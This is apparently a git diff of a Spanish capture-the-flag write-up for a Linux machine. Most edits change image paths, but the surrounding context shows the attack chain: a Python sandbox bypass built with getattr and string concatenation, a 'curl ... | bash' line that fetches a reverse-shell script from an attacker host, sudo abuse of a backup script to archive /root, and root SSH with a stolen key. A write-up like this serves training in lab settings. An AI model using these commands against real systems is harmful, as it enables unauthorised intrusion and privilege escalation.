@@ -3,7 +3,7 @@
 
 # Ficha técnica
 
-![code](code.png)
+![code](../Code/Images/code.png)
 
 | **Campo**                | **Detalle**         |
 | ------------------------ | ------------------- |
@@ -12,6 +12,7 @@
 | **Sistema Operativo**    | Linux               |
 | **Creador**              | FisMatHack          |
 | **Fecha de Lanzamiento** | 22 de Marzo de 2025 |
+
 ## Técnicas Empleadas
 
 - **Acceso Inicial:** Evasión de Restricciones (_Python Sandbox Escape / Bypass_).
@@ -117,7 +118,7 @@ nmap -p22,5000 -sCV 10.129.33.135
 
 Ante el hallazgo del servicio en el puerto 5000, se realizó la inspección visual de la interfaz web, confirmando la existencia de un entorno interactivo diseñado para compilar y ejecutar scripts de Python en el servidor.
 
-![web | 800 x 250](web.png)
+![web | 800 x 250](../Code/Images/web.png)
 
 ### Metodología de Evasión de Restricciones (_Bypass_)
 
@@ -196,7 +197,7 @@ getattr(base, 'sys' + 'tem')('curl http://10.10.14.5/confirmacion_rce')
 
 Al ingresar el _payload_ modificado en el editor de código, el servidor web local (`http.server`) desplegado en la máquina atacante registró la siguiente interacción:
 
-![rce | 800](rce.png)
+![rce | 800](../Code/Images/rce.png)
 
 ### Conclusión Técnica
 
@@ -254,7 +255,7 @@ getattr(test, 'syst' + 'em')('curl http://10.10.16.77 | bash')
 
 El servidor web registró la descarga del script y segundos después, el _listener_ de `netcat` capturó la conexión entrante, proporcionando una shell como el usuario: `app-production`.
 
-![gain-access | 800](gain-access.png)
+![gain-access | 800](../Code/Images/gain-access.png)
 
 ---
 
@@ -351,7 +352,7 @@ sudo -l
 
 **Resultado:** Se determinó que el usuario `martin` cuenta con permisos para ejecutar, sin requerir contraseña (`NOPASSWD`), un script específico con privilegios de superusuario:
 
-![sudo-l | 800](sudo-l.png)
+![sudo-l | 800](../Code/Images/sudo-l.png)
 
 ---
 
@@ -387,7 +388,7 @@ Puesto que el usuario `martin` tiene permisos de escritura sobre `task.json`, el
 
 **Configuración del `task.json` malicioso:**
 
-![task-json | 800](task-json.png)
+![task-json | 800](../Code/Images/task-json.png)
 
 Tras configurar el archivo `task.json` con la carga útil maliciosa, se procedió a ejecutar el script `/usr/bin/backy.sh` utilizando privilegios de superusuario para procesar la tarea manipulada.
 
@@ -401,7 +402,7 @@ sudo /usr/bin/backy.sh task.json
 
 El script procesó con éxito la ruta ofuscada y generó el archivo comprimido del directorio `/root` dentro de la carpeta de respaldos del usuario. Al listar el destino, se identificó el archivo empaquetado:
 
-![backup | 800](backup.png)
+![backup | 800](../Code/Images/backup.png)
 
 ```bash
 ls -l /home/martin/
@@ -438,7 +439,7 @@ ssh -i id_rsa root@10.129.33.135
 
 Al completar la autenticación, se obtuvo una sesión interactiva con las credenciales del administrador del sistema.
 
-![root | 800](root.png)
+![root | 800](../Code/Images/root.png)
 
 ---
 
